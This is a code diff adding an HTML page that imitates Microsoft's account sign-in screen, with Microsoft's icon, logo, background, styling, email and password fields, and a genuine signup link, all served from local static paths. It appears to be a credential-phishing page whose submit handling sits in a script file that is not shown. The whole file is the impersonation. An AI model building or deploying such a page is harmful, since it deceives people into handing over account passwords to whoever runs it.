@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title></title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="/static/images/microsoft.ico">
+  </head>
+  <body>
+    <main>
+      <div>
+        <img class="microsoft" src="/static/images/microsoft.svg">
+        <h3>Sign in</h3>
+        <input id="user" type="text" placeholder="Email, phone, or Skype">
+        <input id="pass" type="password" placeholder="Password">
+        <label class="noacc">No account? <a href="https://signup.live.com/signup">Create one!</a></label>
+        <button id="submit">Sign in</button>
+      </div>
+    </main>
+    <script type="module" src="/static/script.js"></script>
+  </body>
+  <style>
+    *{
+      padding: 0;
+      margin: 0;
+      font-family: "Times New Roman", Georgia, serif;
+    }
+
+    body{
+      background: url("/static/images/microsoftbg.svg")
+    }
+
+    main{
+      position: absolute;
+      z-index: auto;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      display: flex;
+      flex-direction: column;
+      gap: 30px;
+      width: 400px;
+    }
+
+    div{
+      display: flex;
+      flex-direction: column;
+      padding: 50px;
+      background: white;
+      gap: 20px;
+    }
+
+    .microsoft{
+      height: 24px;
+      width: 100px;
+    }
+
+    input{
+      font-size: 14px;
+      padding-bottom: 10px;
+      outline: none;
+      border: none;
+      border-bottom: solid 1px black;
+    }
+
+    input:focus{
+      padding-bottom: 10px;
+      outline: none;
+      border: none;
+      border-bottom: solid 1px #0067b8;
+    }
+
+    button{
+      color: #fff;
+      background-color: #0067b8;
+      display: block;
+      width: 100%;
+      padding: 10px;
+      cursor: pointer;
+      border: solid 1px #0067b8;
+      outline: none;
+      font-size: 14px;
+    }
+
+    button:hover{
+      border: solid 1px black;
+      text-decoration: underline;
+    }
+
+    h3{
+      line-height: 1.75rem;
+      color: #1b1b1b;
+      font-size: 1.5rem;
+      font-weight: 600;
+      margin-bottom: 5px;
+    }
+
+    a{
+      color: #0067b8;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    a:hover{
+      color: gray;
+      text-decoration: underline;
+    }
+
+  </style>
+</html>
